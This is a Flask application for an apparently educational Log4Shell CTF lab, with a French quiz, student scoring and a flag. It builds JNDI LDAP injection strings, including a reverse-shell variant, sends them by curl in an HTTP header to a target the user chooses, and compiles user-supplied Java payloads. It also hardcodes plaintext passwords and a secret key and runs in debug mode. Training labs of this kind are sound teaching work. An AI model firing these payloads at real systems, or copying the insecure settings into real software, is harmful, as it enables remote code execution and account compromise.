from flask import Flask, render_template, request, jsonify, redirect, url_for, send_file
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
import subprocess
import requests
import time
import os
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import io

app = Flask(__name__)
app.secret_key = 'log4shell_ctf_secret_key_2026'

# ╔══════════════════════════════════════════════╗
# ║        🚩 LAB FARAH — CONFIGURATION          ║
# ╚══════════════════════════════════════════════╝
FLAG        = "FLAG{f4r4h_l0g4sh3ll_CVE-2021-44228_pwn3d}"
LAB_AUTHOR  = "Farah"
LAB_NAME    = "Farah's Log4Shell CTF Lab"
QUIZ_SEUIL  = 80   # % minimum pour debloquer le flag via le quiz

# ── Configuration reseau Docker ───────────────────────────────────────────────
# Injectees par docker-compose via 'environment' — noms de services Docker.
# Docker resout ces noms automatiquement → portable sur toutes les machines.
VULNERABLE_HOST = os.environ.get('VULNERABLE_HOST', 'vulnerable')
VULNERABLE_PORT = os.environ.get('VULNERABLE_PORT', '8080')
LDAP_HOST       = os.environ.get('LDAP_HOST',       'ldap')
LDAP_PORT_ENV   = os.environ.get('LDAP_PORT',       '1389')

# Repertoire de base detecte automatiquement
BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
ATTACKER_DIR = os.path.join(BASE_DIR, '..', 'attacker-webserver')

# ── Lab-Manager API ───────────────────────────────────────────────────────────
# Le lab-manager gere le cycle de vie des containers (spawn/destroy/status).
# Ton app.py ne touche PLUS jamais Docker directement.
#
# Endpoints utilises :
#   GET  /api-lab/{lab_id}/status   → etat du lab
#   POST /api-lab/{lab_id}/spawn    → demarrer les containers
#   POST /api-lab/{lab_id}/destroy  → arreter les containers
#
# Variables d'environnement a definir dans docker-compose.yml :
#   LAB_MANAGER_URL : URL de base du lab-manager  ex: http://lab-manager:8000
#   LAB_ID          : identifiant du lab           ex: log4shell-farah
LAB_MANAGER_URL = os.environ.get('LAB_MANAGER_URL', 'http://lab-manager:8000')
LAB_ID          = os.environ.get('LAB_ID',          'log4shell')
# ─────────────────────────────────────────────────────────────────────────────

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Base de donnees utilisateurs
users_db = {
    'student':   {'password': 'student123', 'role': 'student',   'name': 'Etudiant'},
    'professor': {'password': 'prof123',    'role': 'professor',  'name': 'Professeur'}
}

# Base de donnees Quiz
quiz_questions = [
    {
        'id': 1,
        'question': 'Quel est le score CVSS de Log4Shell (CVE-2021-44228)?',
        'options': ['7.5', '9.0', '10.0', '8.5'],
        'correct': 2,
        'explanation': 'Log4Shell a un score CVSS de 10.0/10, ce qui en fait une vulnerabilite critique maximale.',
        'points': 10
    },
    {
        'id': 2,
        'question': 'Que signifie JNDI?',
        'options': [
            'Java Network Data Interface',
            'Java Naming and Directory Interface',
            'Java Native Development Interface',
            'Java Network Directory Integration'
        ],
        'correct': 1,
        'explanation': "JNDI signifie Java Naming and Directory Interface, une API Java pour acceder a des services de nommage.",
        'points': 10
    },
    {
        'id': 3,
        'question': 'Quelle syntaxe declenche la vulnerabilite Log4Shell?',
        'options': [
            '{{jndi:ldap://...}}',
            '${jndi:ldap://...}',
            '[jndi:ldap://...]',
            '<jndi:ldap://...>'
        ],
        'correct': 1,
        'explanation': 'La syntaxe ${jndi:ldap://...} est utilisee par Log4j pour effectuer des lookups JNDI.',
        'points': 15
    },
    {
        'id': 4,
        'question': "Quel type de serveur est utilise dans l'exploitation Log4Shell?",
        'options': ['HTTP', 'LDAP', 'FTP', 'SSH'],
        'correct': 1,
        'explanation': 'Un serveur LDAP malveillant est utilise pour rediriger vers le payload Java.',
        'points': 10
    },
    {
        'id': 5,
        'question': 'Quelle version de Log4j corrige completement la vulnerabilite?',
        'options': ['2.15.0', '2.16.0', '2.17.1', '2.14.1'],
        'correct': 2,
        'explanation': 'La version 2.17.1 corrige completement Log4Shell et ses variantes.',
        'points': 15
    },
    {
        'id': 6,
        'question': 'Quel header HTTP est couramment utilise pour injecter le payload?',
        'options': ['Content-Type', 'User-Agent', 'Accept', 'Host'],
        'correct': 1,
        'explanation': "Le header User-Agent est souvent logge et donc un vecteur d'injection courant.",
        'points': 10
    },
    {
        'id': 7,
        'question': "Que permet d'obtenir Log4Shell?",
        'options': [
            'Lecture de fichiers',
            'Deni de service',
            'Execution de code a distance (RCE)',
            'Injection SQL'
        ],
        'correct': 2,
        'explanation': "Log4Shell permet l'execution de code arbitraire a distance (Remote Code Execution).",
        'points': 15
    },
    {
        'id': 8,
        'question': 'Quelle commande Java desactive les lookups JNDI?',
        'options': [
            '-Dlog4j.disable=true',
            '-Dlog4j2.formatMsgNoLookups=true',
            '-Djndi.disable=true',
            '-Dlog4j.safe=true'
        ],
        'correct': 1,
        'explanation': 'Le flag -Dlog4j2.formatMsgNoLookups=true desactive les lookups dans les messages.',
        'points': 15
    },
    {
        'id': 9,
        'question': 'En quelle annee Log4Shell a-t-elle ete decouverte?',
        'options': ['2020', '2021', '2022', '2023'],
        'correct': 1,
        'explanation': 'Log4Shell a ete decouverte publiquement en decembre 2021.',
        'points': 5
    },
    {
        'id': 10,
        'question': 'Quel protocole peut etre utilise a la place de LDAP?',
        'options': ['RMI', 'DNS', 'CORBA', 'Tous les precedents'],
        'correct': 3,
        'explanation': 'JNDI supporte plusieurs protocoles: LDAP, RMI, DNS, CORBA, etc.',
        'points': 20
    }
]

# Stockage des sessions
user_sessions    = {}
attack_analytics = {
    'total_attacks':      0,
    'successful_attacks': 0,
    'failed_attacks':     0,
    'total_shells':       0
}
attack_log = []


# ══════════════════════════════════════════════
#  Helpers — Sessions & Flag
# ══════════════════════════════════════════════

def init_session(username):
    if username not in user_sessions:
        user_sessions[username] = {
            'start_time':     datetime.now(),
            'actions':        [],
            'score':          0,
            'attacks':        0,
            'success':        0,
            'quiz_score':     0,
            'quiz_attempts':  0,
            'quiz_completed': [],
            'flag_unlocked':  False,
            'flag_source':    None,
            'flag_time':      None,
        }

def unlock_flag(username, source):
    if username in user_sessions and not user_sessions[username].get('flag_unlocked'):
        user_sessions[username]['flag_unlocked'] = True
        user_sessions[username]['flag_source']   = source
        user_sessions[username]['flag_time']     = datetime.now().strftime('%H:%M:%S')

def flag_payload(username):
    if username in user_sessions and user_sessions[username].get('flag_unlocked'):
        return {
            'flag':          FLAG,
            'flag_unlocked': True,
            'flag_source':   user_sessions[username].get('flag_source'),
            'author':        LAB_AUTHOR,
            'lab_name':      LAB_NAME,
        }
    return {'flag': None, 'flag_unlocked': False}


# ══════════════════════════════════════════════
#  Helpers — Lab-Manager API
# ══════════════════════════════════════════════

def lab_manager_request(method, endpoint, timeout=10):
    """
    Appelle l'API du lab-manager.
    Retourne (data_dict, error_string).
    Si le lab-manager est injoignable, retourne une erreur propre
    sans faire planter le dashboard.
    """
    url = f"{LAB_MANAGER_URL}/api-lab/{LAB_ID}/{endpoint}"
    try:
        resp = requests.request(method, url, timeout=timeout)
        resp.raise_for_status()
        return resp.json(), None
    except requests.exceptions.ConnectionError:
        return None, f"Lab-manager injoignable ({LAB_MANAGER_URL})"
    except requests.exceptions.Timeout:
        return None, "Lab-manager : timeout"
    except requests.exceptions.HTTPError as e:
        return None, f"Lab-manager erreur HTTP {e.response.status_code}"
    except Exception as e:
        return None, str(e)


class User(UserMixin):
    def __init__(self, username, role, name):
        self.id   = username
        self.role = role
        self.name = name

@login_manager.user_loader
def load_user(user_id):
    if user_id in users_db:
        return User(user_id, users_db[user_id]['role'], users_db[user_id]['name'])
    return None

def log_user_action(action, details=''):
    if current_user.is_authenticated:
        username = current_user.id
        if username in user_sessions:
            user_sessions[username]['actions'].append({
                'time':    datetime.now().strftime('%H:%M:%S'),
                'action':  action,
                'details': details
            })


# ══════════════════════════════════════════════
#  Routes — Authentification
# ══════════════════════════════════════════════

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data     = request.json
        username = data.get('username')
        password = data.get('password')

        if username in users_db and users_db[username]['password'] == password:
            user = User(username, users_db[username]['role'], users_db[username]['name'])
            login_user(user)
            init_session(username)
            return jsonify({
                'status':   'success',
                'role':     user.role,
                'redirect': '/professor' if user.role == 'professor' else '/dashboard'
            })

        return jsonify({'status': 'error', 'message': 'Identifiants invalides'})

    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


# ══════════════════════════════════════════════
#  Routes — Pages
# ══════════════════════════════════════════════

@app.route('/')
def index():
    if current_user.is_authenticated:
        return redirect(url_for('professor_dashboard') if current_user.role == 'professor' else url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    if current_user.role == 'professor':
        return redirect(url_for('professor_dashboard'))
    return render_template('dashboard.html', user=current_user)

@app.route('/learn')
@login_required
def learn():
    return render_template('learn.html', user=current_user)

@app.route('/quiz')
@login_required
def quiz():
    if current_user.role == 'professor':
        return redirect(url_for('professor_dashboard'))
    return render_template('quiz.html', user=current_user)

@app.route('/professor')
@login_required
def professor_dashboard():
    if current_user.role != 'professor':
        return redirect(url_for('dashboard'))
    return render_template('professor.html', user=current_user)

@app.route('/success')
@login_required
def success_page():
    if current_user.role == 'professor':
        return redirect(url_for('professor_dashboard'))
    return render_template('success.html', user=current_user)


# ══════════════════════════════════════════════
#  API — Lab-Manager (plus de docker directement)
# ══════════════════════════════════════════════

@app.route('/api/status')
@login_required
def status():
    """
    Interroge le lab-manager pour connaitre l'etat des containers.
    GET /api-lab/{lab_id}/status
    """
    data, error = lab_manager_request('GET', 'status')
    if error:
        return jsonify({'status': 'error', 'message': error})

    log_user_action('check_status')
    return jsonify({'status': 'success', 'lab': data})


@app.route('/api/start-containers', methods=['POST'])
@login_required
def start_containers():
    """
    Demande au lab-manager de demarrer les containers.
    POST /api-lab/{lab_id}/spawn
    """
    data, error = lab_manager_request('POST', 'spawn')
    if error:
        return jsonify({'status': 'error', 'message': error})

    if current_user.id in user_sessions:
        user_sessions[current_user.id]['score'] += 10

    log_user_action('start_containers')
    return jsonify({'status': 'success', 'message': 'Lab demarre (+10 points)', 'lab': data})


@app.route('/api/stop-containers', methods=['POST'])
@login_required
def stop_containers():
    """
    Demande au lab-manager d'arreter les containers.
    POST /api-lab/{lab_id}/destroy
    """
    data, error = lab_manager_request('POST', 'destroy')
    if error:
        return jsonify({'status': 'error', 'message': error})

    log_user_action('stop_containers')
    return jsonify({'status': 'success', 'message': 'Lab arrete', 'lab': data})


# ══════════════════════════════════════════════
#  API — Quiz
# ══════════════════════════════════════════════

@app.route('/api/quiz/questions')
@login_required
def get_quiz_questions():
    if current_user.role != 'student':
        return jsonify({'status': 'error', 'message': 'Acces refuse'})

    questions = [
        {'id': q['id'], 'question': q['question'], 'options': q['options'], 'points': q['points']}
        for q in quiz_questions
    ]
    return jsonify({'status': 'success', 'questions': questions})


@app.route('/api/quiz/submit', methods=['POST'])
@login_required
def submit_quiz():
    if current_user.role != 'student':
        return jsonify({'status': 'error', 'message': 'Acces refuse'})

    data    = request.json
    answers = data.get('answers', {})

    score        = 0
    total_points = 0
    results      = []

    for q in quiz_questions:
        total_points += q['points']
        user_answer   = int(answers.get(str(q['id']), -1))
        is_correct    = user_answer == q['correct']
        if is_correct:
            score += q['points']

        results.append({
            'id':             q['id'],
            'question':       q['question'],
            'user_answer':    user_answer,
            'correct_answer': q['correct'],
            'is_correct':     is_correct,
            'explanation':    q['explanation'],
            'points':         q['points'] if is_correct else 0
        })

    percentage = round((score / total_points) * 100, 2)

    if percentage >= QUIZ_SEUIL:
        unlock_flag(current_user.id, 'quiz')

    if current_user.id in user_sessions:
        user_sessions[current_user.id]['quiz_score']     = score
        user_sessions[current_user.id]['score']         += score
        user_sessions[current_user.id]['quiz_attempts'] += 1
        user_sessions[current_user.id]['quiz_completed'].append({
            'time':  datetime.now().strftime('%H:%M:%S'),
            'score': score,
            'total': total_points
        })

    log_user_action('quiz_completed', f'Score: {score}/{total_points} ({percentage}%)')

    return jsonify({
        'status':     'success',
        'score':      score,
        'total':      total_points,
        'percentage': percentage,
        'results':    results,
        **flag_payload(current_user.id)
    })


@app.route('/api/quiz/stats')
@login_required
def get_quiz_stats():
    init_session(current_user.id)
    s = user_sessions[current_user.id]
    return jsonify({
        'status':        'success',
        'quiz_score':    s.get('quiz_score', 0),
        'attempts':      s.get('quiz_attempts', 0),
        'flag_unlocked': s.get('flag_unlocked', False)
    })


# ══════════════════════════════════════════════
#  API — Score & profil etudiant 🚩
# ══════════════════════════════════════════════

@app.route('/api/user/score')
@login_required
def get_user_score():
    init_session(current_user.id)
    s = user_sessions[current_user.id]
    return jsonify({
        'status':     'success',
        'score':      s.get('score', 0),
        'attacks':    s.get('attacks', 0),
        'success':    s.get('success', 0),
        'quiz_score': s.get('quiz_score', 0),
        **flag_payload(current_user.id)
    })


# ══════════════════════════════════════════════
#  API — Analytics (professeur)
# ══════════════════════════════════════════════

@app.route('/api/analytics/global')
@login_required
def get_global_analytics():
    return jsonify({'status': 'success', 'data': attack_analytics})


@app.route('/api/analytics/students')
@login_required
def get_student_analytics():
    if current_user.role != 'professor':
        return jsonify({'status': 'error', 'message': 'Acces refuse'})

    students_data = []
    for username, s in user_sessions.items():
        if username == 'professor':
            continue
        user = users_db.get(username, {})
        students_data.append({
            'username':      username,
            'name':          user.get('name', username),
            'score':         s.get('score', 0),
            'attacks':       s.get('attacks', 0),
            'success':       s.get('success', 0),
            'quiz_score':    s.get('quiz_score', 0),
            'quiz_attempts': s.get('quiz_attempts', 0),
            'flag_unlocked': s.get('flag_unlocked', False),
            'flag_source':   s.get('flag_source', None),
            'flag_time':     s.get('flag_time', None),
            'time_spent':    str(datetime.now() - s.get('start_time', datetime.now())),
            'last_action':   s['actions'][-1]['action'] if s.get('actions') else 'Aucune'
        })

    return jsonify({'status': 'success', 'students': students_data})


@app.route('/api/analytics/export', methods=['POST'])
@login_required
def export_analytics():
    if current_user.role != 'professor':
        return jsonify({'status': 'error', 'message': 'Acces refuse'})

    buffer = io.BytesIO()
    p      = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter

    p.setFont("Helvetica-Bold", 22)
    p.drawString(100, height - 80,  f"{LAB_NAME} - Rapport")
    p.setFont("Helvetica", 11)
    p.drawString(100, height - 105, f"Date   : {datetime.now().strftime('%d/%m/%Y %H:%M')}")
    p.drawString(100, height - 120, f"Auteur : {LAB_AUTHOR}")

    y = height - 165
    p.setFont("Helvetica-Bold", 14)
    p.drawString(100, y, "Statistiques Globales")
    y -= 25
    p.setFont("Helvetica", 11)
    for label, val in [
        ("Total attaques",    attack_analytics['total_attacks']),
        ("Attaques reussies", attack_analytics['successful_attacks']),
        ("Shells obtenus",    attack_analytics['total_shells']),
    ]:
        p.drawString(120, y, f"{label} : {val}")
        y -= 18

    y -= 20
    p.setFont("Helvetica-Bold", 14)
    p.drawString(100, y, "Resultats Etudiants")
    y -= 25
    p.setFont("Helvetica", 10)

    for username, s in user_sessions.items():
        if username == 'professor' or y < 80:
            continue
        flag_status = f"FLAG OK ({s.get('flag_source','?')} - {s.get('flag_time','?')})" \
                      if s.get('flag_unlocked') else "Flag non debloque"
        p.drawString(120, y,
            f"{username} | Score: {s.get('score',0)} | Quiz: {s.get('quiz_score',0)} | {flag_status}")
        y -= 18

    p.showPage()
    p.save()
    buffer.seek(0)

    return send_file(buffer, as_attachment=True,
                     download_name='farah_log4shell_report.pdf',
                     mimetype='application/pdf')


# ══════════════════════════════════════════════
#  API — Attaque & Payload
#  (curl vers les containers via noms Docker)
# ══════════════════════════════════════════════

@app.route('/api/generate-payload', methods=['POST'])
@login_required
def generate_payload():
    data         = request.json
    payload_type = data.get('type', 'simple')
    ldap_host    = data.get('ip',        LDAP_HOST)
    ldap_port    = data.get('ldap_port', LDAP_PORT_ENV)

    payloads = {
        'simple':        f'${{jndi:ldap://{ldap_host}:{ldap_port}/Exploit}}',
        'reverse_shell': f'${{jndi:ldap://{ldap_host}:{ldap_port}/Rev}}'
    }
    log_user_action('generate_payload')
    return jsonify({'status': 'success', 'payload': payloads.get(payload_type, payloads['simple'])})


@app.route('/api/launch-attack', methods=['POST'])
@login_required
def launch_attack():
    data    = request.json
    # Noms de services Docker → resolus automatiquement sur n'importe quelle machine
    target  = data.get('target',  f'{VULNERABLE_HOST}:{VULNERABLE_PORT}')
    payload = data.get('payload', f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}')

    try:
        subprocess.run(
            ['curl', f'http://{target}', '-H', f'X-Api-Version: {payload}'],
            capture_output=True, text=True, timeout=5
        )

        attack_analytics['total_attacks']      += 1
        attack_analytics['successful_attacks'] += 1
        attack_analytics['total_shells']       += 1

        if current_user.id in user_sessions:
            user_sessions[current_user.id]['attacks'] += 1
            user_sessions[current_user.id]['score']   += 50
            user_sessions[current_user.id]['success'] += 1

        unlock_flag(current_user.id, 'attack')

        attack_log.append({
            'time':    datetime.now().strftime('%H:%M:%S'),
            'user':    current_user.name,
            'target':  target,
            'payload': payload
        })
        log_user_action('launch_attack', f'Target: {target}')

        return jsonify({
            'status':  'success',
            'message': 'Attaque lancee (+50 points)',
            **flag_payload(current_user.id)
        })

    except Exception as e:
        attack_analytics['failed_attacks'] += 1
        return jsonify({'status': 'error', 'message': str(e)})


@app.route('/api/compile-payload', methods=['POST'])
@login_required
def compile_payload():
    data          = request.json
    java_code     = data.get('code', '')
    rev_java_path = os.path.join(ATTACKER_DIR, 'Rev.java')

    try:
        with open(rev_java_path, 'w') as f:
            f.write(java_code)

        result = subprocess.run(
            ['javac', '--release', '8', rev_java_path],
            capture_output=True, text=True
        )

        if result.returncode == 0:
            if current_user.id in user_sessions:
                user_sessions[current_user.id]['score'] += 20
            log_user_action('compile_payload')
            return jsonify({'status': 'success', 'message': 'Payload compile (+20 points)'})
        else:
            return jsonify({'status': 'error', 'message': result.stderr})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


@app.route('/api/start-webserver', methods=['POST'])
@login_required
def start_webserver():
    try:
        result = subprocess.run(['lsof', '-ti:8888'], capture_output=True, text=True)
        if result.stdout.strip():
            return jsonify({'status': 'success', 'message': 'Serveur web deja actif'})

        os.chdir(ATTACKER_DIR)
        subprocess.Popen(['python3', '-m', 'http.server', '8888'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        log_user_action('start_webserver')
        return jsonify({'status': 'success', 'message': 'Serveur web demarre'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


@app.route('/api/attack-log')
@login_required
def get_attack_log():
    return jsonify({'status': 'success', 'log': attack_log})


# ══════════════════════════════════════════════
#  Lancement
# ══════════════════════════════════════════════

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)